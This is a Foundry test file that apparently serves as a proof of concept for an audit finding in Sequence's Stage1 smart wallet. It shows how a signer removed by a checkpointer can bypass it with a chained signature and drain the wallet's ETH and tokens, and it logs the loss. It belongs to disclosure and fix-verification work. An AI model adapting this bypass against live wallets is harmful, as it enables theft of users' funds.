// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.27;

import { Test, console } from "forge-std/Test.sol";

import { Factory } from "src/Factory.sol";
import { Stage1Module } from "src/Stage1Module.sol";
import { Payload } from "src/modules/Payload.sol";
import { ICheckpointer, Snapshot } from "src/modules/interfaces/ICheckpointer.sol";

import { MockERC20 } from "test/mocks/MockERC20.sol";

/// @notice Checkpointer that reports the latest wallet configuration (config2, checkpoint 2),
/// in which Alice is no longer a signer.
contract LatestConfigCheckpointer is ICheckpointer {

  bytes32 public latestImageHash;

  function setLatest(
    bytes32 _imageHash
  ) external {
    latestImageHash = _imageHash;
  }

  function snapshotFor(address, bytes calldata) external view returns (Snapshot memory) {
    return Snapshot(latestImageHash, 2);
  }

}

/// @title Loss measurement for Code4rena 2025-10-sequence H-01 (finding 63760)
/// @notice A real Stage1 wallet (Factory + Stage1Module) holds 100 ETH and 1,000,000 MOCK tokens.
/// Its on-chain configuration is config1 (Alice, threshold 1, checkpoint 1, behind a checkpointer).
/// The checkpointer says the latest configuration is config2 (Bob only, checkpoint 2), so Alice
/// has been evicted. Alice signs one payload that sends everything to herself.
///   - Control: her normal signature (checkpointer read) is rejected with UnusedSnapshot.
///   - Attack: the same payload wrapped in a chained signature with the checkpointer bit unset.
/// The test logs balances before and after. It does not assert the attack succeeds, so the same
/// file runs at the vulnerable commit (loss = all funds) and at the fix (attack reverts, loss 0).
contract Loss63760_Sequence is Test {

  uint256 constant ETH_FUNDS = 100 ether;
  uint256 constant TOKEN_FUNDS = 1_000_000 ether; // MockERC20 has 18 decimals

  Factory factory;
  Stage1Module stage1;
  MockERC20 token;
  LatestConfigCheckpointer checkpointer;
  address payable wallet;
  address alice;
  uint256 aliceKey;

  function _leaf(address addr, uint256 weight) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked("Sequence signer:\n", addr, weight));
  }

  function _fk(bytes32 a, bytes32 b) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked(a, b));
  }

  // Image hash of a one-signer configuration, built the same way BaseSig.recover builds it.
  function _imageHash(address signer, uint256 checkpoint) internal view returns (bytes32 h) {
    h = _leaf(signer, 1);
    h = _fk(h, bytes32(uint256(1))); // threshold
    h = _fk(h, bytes32(checkpoint));
    h = _fk(h, bytes32(uint256(uint160(address(checkpointer)))));
  }

  function setUp() public {
    (alice, aliceKey) = makeAddrAndKey("alice");
    address bob = makeAddr("bob");

    factory = new Factory();
    stage1 = new Stage1Module(address(factory), address(0));
    checkpointer = new LatestConfigCheckpointer();

    // Wallet is deployed for config1 (Alice); the checkpointer is ahead at config2 (Bob).
    wallet = payable(factory.deploy(address(stage1), _imageHash(alice, 1)));
    checkpointer.setLatest(_imageHash(bob, 2));

    token = new MockERC20();
    token.transfer(wallet, TOKEN_FUNDS);
    vm.deal(wallet, ETH_FUNDS);
  }

  /// Payload: call 0 sends all ETH to Alice, call 1 transfers all MOCK to Alice.
  /// Both calls revert the batch on error (behaviorOnError = 1). Space 0, nonce 0.
  function _drainPayload() internal view returns (bytes memory packed, Payload.Decoded memory decoded) {
    bytes memory transferData = abi.encodeWithSelector(MockERC20.transfer.selector, alice, TOKEN_FUNDS);

    packed = abi.encodePacked(
      bytes1(0x01), // global flag: space = 0, nonce size 0, call count in 1 byte
      uint8(2),
      bytes1(0x42), // call flags: has value, revert on error
      alice,
      ETH_FUNDS,
      bytes1(0x44), // call flags: has data, revert on error
      address(token),
      bytes3(uint24(transferData.length)),
      transferData
    );

    decoded.kind = Payload.KIND_TRANSACTIONS;
    decoded.calls = new Payload.Call[](2);
    decoded.calls[0] = Payload.Call(alice, ETH_FUNDS, "", 0, false, false, 1);
    decoded.calls[1] = Payload.Call(address(token), 0, transferData, 0, false, false, 1);
  }

  // Normal config1 body: flag 0x44 (checkpointer used, 1-byte checkpoint, normal type),
  // checkpointer address, optional checkpointer-data block, checkpoint 1, threshold 1,
  // then one signer leaf (FLAG_SIGNATURE_HASH, weight 1) with an ERC-2098 compact signature.
  function _config1Sig(bytes32 opHash, bool withCheckpointerData) internal view returns (bytes memory) {
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, opHash);
    bytes32 yParityAndS = bytes32((uint256(v - 27) << 255) | uint256(s));
    return abi.encodePacked(
      bytes1(0x44),
      address(checkpointer),
      withCheckpointerData ? abi.encodePacked(bytes3(0)) : bytes(""),
      uint8(1),
      uint8(1),
      bytes1(0x01),
      r,
      yParityAndS
    );
  }

  function _log(string memory label) internal view {
    console.log(label);
    console.log("  wallet ETH (wei)      :", wallet.balance);
    console.log("  wallet MOCK (wei)     :", token.balanceOf(wallet));
    console.log("  attacker ETH (wei)    :", alice.balance);
    console.log("  attacker MOCK (wei)   :", token.balanceOf(alice));
  }

  function test_loss_evicted_signer_drains_wallet() external {
    (bytes memory packed, Payload.Decoded memory decoded) = _drainPayload();
    bytes32 opHash = Payload.hashFor(decoded, wallet);

    _log("BEFORE");
    uint256 walletEthBefore = wallet.balance;
    uint256 walletTokBefore = token.balanceOf(wallet);

    // Control: Alice's normal signature. The checkpointer snapshot (config2) is read and
    // her stale config1 signature must be rejected.
    bytes memory direct = _config1Sig(opHash, true);
    try Stage1Module(wallet).execute(packed, direct) {
      console.log("CONTROL: direct signature by evicted signer ACCEPTED (unexpected)");
    } catch (bytes memory err) {
      console.log("CONTROL: direct signature by evicted signer rejected, selector:");
      console.logBytes4(bytes4(err));
    }

    // Attack: chained wrapper with outer flag 0x05 (chained, checkpointer bit unset) and one
    // inner config1 signature without the checkpointer-data block.
    bytes memory inner = _config1Sig(opHash, false);
    bytes memory chained = abi.encodePacked(bytes1(0x05), bytes3(uint24(inner.length)), inner);
    bool attackOk;
    try Stage1Module(wallet).execute(packed, chained) {
      attackOk = true;
      console.log("ATTACK: chained signature ACCEPTED, payload executed");
    } catch (bytes memory err) {
      console.log("ATTACK: chained signature rejected, selector:");
      console.logBytes4(bytes4(err));
    }

    _log("AFTER");
    uint256 ethLoss = walletEthBefore - wallet.balance;
    uint256 tokLoss = walletTokBefore - token.balanceOf(wallet);
    console.log("attack succeeded        :", attackOk);
    console.log("user funds ETH (wei)    :", walletEthBefore);
    console.log("user loss ETH (wei)     :", ethLoss);
    console.log("loss ETH (basis points) :", ethLoss * 10_000 / walletEthBefore);
    console.log("user funds MOCK (wei)   :", walletTokBefore);
    console.log("user loss MOCK (wei)    :", tokLoss);
    console.log("loss MOCK (basis points):", tokLoss * 10_000 / walletTokBefore);
    console.log("attacker gain ETH (wei) :", alice.balance);
    console.log("attacker gain MOCK (wei):", token.balanceOf(alice));
  }

}
